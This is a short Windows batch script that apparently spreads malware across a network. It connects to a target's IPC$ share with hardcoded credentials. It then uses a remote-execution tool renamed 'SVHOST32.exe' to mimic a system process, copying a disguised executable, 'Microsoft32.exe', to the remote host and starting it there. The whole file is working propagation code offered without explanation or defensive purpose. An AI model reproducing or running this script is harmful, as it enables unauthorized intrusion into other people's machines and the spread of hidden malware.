@echo off 
Smshost.exe %1 0 
Smshost.exe %1 1 
net use \\%1\IPC$ "asd#321" /user:e 
SVHOST32.exe \\%1 -u e -p "asd#321" attrib.exe -r Microsoft32.exe 
SVHOST32.exe \\%1 -u e -p "asd#321" -f -c -d Microsoft32.exe -o 
SVHOST32.exe \\%1 -u e -p "asd#321" -d Microsoft32.exe -o 
